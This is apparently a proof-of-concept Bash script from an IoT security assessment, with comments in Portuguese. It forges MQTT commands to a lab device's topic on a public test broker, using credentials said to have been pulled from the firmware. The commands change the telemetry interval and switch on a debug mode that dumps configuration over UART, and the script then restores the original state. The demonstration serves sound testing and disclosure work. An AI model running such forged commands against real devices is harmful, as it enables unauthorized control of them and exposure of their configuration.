#!/usr/bin/env bash
# Demonstração controlada F04 — comando forjado SOMENTE no tópico do dispositivo de laboratório.
# Credenciais: as mesmas extraídas do firmware (F01), que também são as credenciais públicas do broker de teste.
set -euo pipefail
H=test.mosquitto.org; P=1884; U=rw; PW=readwrite
T=nexahome/nx-4b9e21
sub() { timeout "$1" mosquitto_sub -h $H -p $P -u $U -P $PW -t "$T/telemetry" -v | while read -r l; do echo "$(date +%T) $l"; done || true; }
pub() { echo "$(date +%T) >>> PUBLISH $T/cmd '$1'"; mosquitto_pub -h $H -p $P -u $U -P $PW -t "$T/cmd" -m "$1"; }

echo "== 1. Linha de base: telemetria legítima (12 s, esperado ~1 msg a cada 5 s)"; sub 12
echo "== 2. Atacante sem nenhuma autenticação do dispositivo envia comando forjado"; pub "set_interval:1"
echo "== 3. Efeito: telemetria agora a cada 1 s (6 s)"; sub 6
echo "== 4. Atacante liga o modo debug remotamente (dump de config na UART)"; pub "debug_on"
sleep 2
echo "== 5. Restauração do estado original"; pub "set_interval:5"; pub "debug_off"
echo "== fim"
